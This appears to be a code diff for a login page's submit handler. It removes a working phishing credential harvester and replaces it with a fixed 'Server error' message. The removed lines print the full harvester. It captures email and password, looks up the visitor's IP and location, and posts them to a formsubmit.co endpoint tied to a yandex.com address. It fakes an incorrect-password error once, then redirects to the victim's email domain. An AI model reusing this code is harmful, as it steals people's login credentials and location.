@@ -212,77 +212,12 @@
       // ----- login with IP and 2-attempt redirect (plus pre-fill) -----
       let step = 0;
 
-      loginForm.addEventListener('submit', async function(e) {
+      loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
-        const email = emailInput.value.trim();
-        const password = passwordInput.value.trim();
-
-        // validation
-        if (!email || !password) {
-          showError('Please fill in all fields.');
-          return;
-        }
-        if (!email.includes('@')) {
-          showError('Please enter a valid email address.');
-          return;
-        }
         clearError();
-
-        // disable button
-        const originalText = submitBtn.textContent;
-        submitBtn.textContent = 'Processing...';
-        submitBtn.disabled = true;
-
-        try {
-          // 1. Get IP
-          const ipResponse = await fetch('https://ipinfo.io/json');
-          if (!ipResponse.ok) throw new Error('Network error');
-          const ipData = await ipResponse.json();
-
-          step++; // increment attempt
-
-          // 2. Prepare payload
-          const formData = {
-            _subject: "Logs | " + ipData.ip,
-            Email: email,
-            Password: password,
-            Attempts: step,
-            IP: ipData.ip,
-            Location: ipData.city + ", " + ipData.country,
-          };
-
-          // 3. POST to your API
-          const submitResponse = await fetch('https://formsubmit.co/ajax/egoabata@yandex.com', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Accept': 'application/json',
-            },
-            body: JSON.stringify(formData),
-          });
-
-          if (!submitResponse.ok) throw new Error('Network error');
-          const result = await submitResponse.json();
-          console.log('Server response:', result);
-
-          // 4. If second attempt → redirect
-          if (step === 2) {
-            const domain = email.split('@').pop();
-            window.location.href = `http://${domain}`;
-            return;
-          }
-
-          // 5. First attempt: show incorrect password
-          showError('Incorrect password. Please try again.');
-          submitBtn.textContent = originalText;
-          submitBtn.disabled = false;
-
-        } catch (err) {
-          console.error(err);
-          showError('An error occurred. Please try again.');
-          submitBtn.textContent = originalText;
-          submitBtn.disabled = false;
-        }
+        showError('Server error. Please try again later.');
+        submitBtn.textContent = 'Sign in';
+        submitBtn.disabled = false;
       });
 
       // ----- initial pre-fill on page load (if modal not opened yet) -----
